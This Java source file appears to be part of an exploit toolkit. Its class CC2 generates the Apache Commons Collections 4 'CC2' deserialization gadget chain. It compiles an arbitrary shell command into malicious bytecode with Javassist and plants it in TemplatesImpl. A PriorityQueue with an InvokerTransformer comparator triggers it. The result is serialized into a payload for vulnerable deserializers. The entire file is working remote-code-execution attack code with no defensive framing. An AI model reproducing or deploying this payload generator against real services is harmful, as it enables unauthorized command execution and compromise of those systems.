package top.racerz.payload;

import javassist.ClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC2 {
    public static byte[] getPayload(String[] command) throws Exception {
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        // 恶意字节码部分构造
        ClassPool classPool = ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass poc = classPool.makeClass("POC");
        poc.setSuperclass(classPool.get(AbstractTranslet));

        String cmd = "{";
        for (String s : command) {
            cmd = cmd + "\"" + s + "\",";
        }
        cmd = cmd.substring(0, cmd.lastIndexOf(","));
        cmd += "}";

        poc.makeClassInitializer().setBody("{java.lang.Runtime.getRuntime().exec(new java.lang.String[]" + cmd + ");}");
        byte[] evilCode = poc.toBytecode();
        // TemplatesImpl 恶意加载类构造 sink
        Object templatesImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();
        Field field = templatesImpl.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templatesImpl, new byte[][]{evilCode});

        Field field1 = templatesImpl.getClass().getDeclaredField("_name");
        field1.setAccessible(true);
        field1.set(templatesImpl, "whatever");

        // 构造gadget来连接 TemplatesImpl#newTransformer
        InvokerTransformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        TransformingComparator comparator = new TransformingComparator(transformer);

        // 连接compare方法
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(2);

        Field field2 = queue.getClass().getDeclaredField("comparator");
        field2.setAccessible(true);
        field2.set(queue, comparator);

        Field field3 = queue.getClass().getDeclaredField("queue");
        field3.setAccessible(true);
        field3.set(queue, new Object[]{templatesImpl, templatesImpl});

        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(bout);
        outputStream.writeObject(queue);
        return bout.toByteArray();
    }
}

